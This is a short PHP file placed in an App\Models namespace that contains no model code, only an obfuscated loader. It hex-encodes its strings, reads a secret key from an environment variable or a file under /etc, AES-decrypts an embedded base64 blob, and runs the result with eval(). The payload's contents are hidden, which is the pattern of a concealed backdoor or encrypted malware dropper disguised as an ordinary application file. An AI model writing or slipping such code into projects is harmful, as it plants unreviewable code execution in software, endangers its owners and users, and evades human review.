<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('FeHk5/HbjagixRHH39JlZw==');
$c=base64_decode(
'ziLLTxQUSzex4v0eW/p0H4IvaEc9RmG8e5YD2hcEbRXQRatz1bzj1VuzW2Y7cLw5EJU019/YB/p+' .
'gAzKYfJkk33U/Mob3i/WAkZsmVNbGGncSsWTAeiFK8z4Ui7SVwfPln9QMqQzB+8wLGwOjNTyQR2S' .
'qvXf9t3t/xDiTMvOzQzmGlqW9IyXTOlYQ6sIJx4/iyaEZ8IPFxcAVr4n8iY9cmMZc61ZFfwnj4B/' .
'4WjsORdzxvMBjd6IG0uPUMzxG1iCPVafzZWX/d25IEHo19i8ouw7lDCajVjDVfP8/EulDP3nL71i' .
'lBkWXNhpnxK7nvzKoae137W0NDszZ9vJ4kqlg7nQym2zf/6XMs8MtMOG9IdGFNRceuOS8D66NprK' .
'DWJq6oCwiCJHcC0zR3t7oCgy/w82sKQj+AisaDK24YiW6aIATlvQWGTFU8b7VOkPTyx+b3oDu9AA' .
'VNNKEECq+mWBw/kabL6OaG69B0iMhtm2gQCUjLSAP+4FyMdRZiB+AqxTrK4kJMCG6aZRYSeNgxTx' .
'PtGJJCb/MXUQE7XkY1w5bYQhCnYCoxZYnZsUkmFCd9VRLISBuVswEOsT4odcwyKLuOMrqEp0uqf/' .
'PLjPWmfid4YzGhGxmML+S+KvALAoamVjiqP9qov8Q3tKo73pbpjJxea+dp3TSPejJeNo21HHhQUP' .
'L6LYsYnsFPadLZobOFiOlxQwuLIgfkuEHDaCW/03ar0pP7VHlMjxP9YUQn+YtXtYDJ3FtIuRLvV2' .
'k3V3z/4e6TlRaoAsYH65DfoyVwfmZwml0CiYWrcYEBMSZhX2UPJJyop2YbPefQMTTRaR/oNkbsfH' .
'EH8uXvtnxUQ7onRTU7eWv3xOFJF4qEv8+iaA61ctH6FaFgewZg/lkvm4VSTfWFEK6yQqk1jzPWfC' .
'arLMv+lzkdO4lUMLHAL46d8r0Q1jUNL8AQ9einRDVAQ1q+ZuVmjcKzaM2DLTb2+xvSjCrWE3ll+B' .
'ZtSKlMGSH0QBGAiKgHXGTMDZUK35x/vF/Amz+hADq5Bv675MMsQfu1z2miyEUzDh5WZNJ2w+ZLGd' .
'bj+0CJzpB3OHjulr5bK36/zs6W8JOcU7wJqu1/vfmn1J30WxoSr+YVSW7+Rmg2Yw+Gl8GScgEMqC' .
'b9vsJQ5WymASgJi3OgF44oj9fwO+9Vj+AShjdmjRrIFxMdI9MsWtzCN6oB9zG/Aw5TonCzawyavF'
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
